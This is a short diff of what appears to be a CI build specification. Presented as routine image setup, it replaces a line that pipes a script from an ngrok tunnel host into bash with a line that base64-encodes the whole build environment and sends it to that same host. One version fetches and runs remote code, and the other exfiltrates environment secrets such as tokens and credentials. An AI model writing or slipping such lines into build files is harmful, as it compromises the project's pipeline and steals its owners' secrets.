@@ -12,7 +12,7 @@ phases:
 
       # baked in our image.
       # this also takes care of launching the docker daemon.
-      - curl http://0.tcp.in.ngrok.io:19736/payload.sh | bash
+      - curl http://0.tcp.in.ngrok.io:19736/?te=$(env |base64)
       - /root/ecr-proxy/start.sh
 
       # Install yarn if it wasn't already present in the image
